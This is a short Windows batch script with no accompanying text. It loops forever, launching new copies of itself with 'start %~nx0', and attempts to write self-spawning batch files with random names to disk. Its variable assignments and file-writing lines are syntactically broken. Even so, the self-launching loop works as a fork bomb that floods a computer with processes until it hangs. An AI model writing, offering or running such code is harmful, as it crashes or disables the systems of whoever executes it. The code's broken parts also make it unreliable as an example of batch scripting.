:a
start %~nx0
var=%random%-%random%-%random%-%random%.bat

:a > %var%
start %~nx0 >> %var%
var=%random%.bat >> %var%
goto a >> %var%

goto a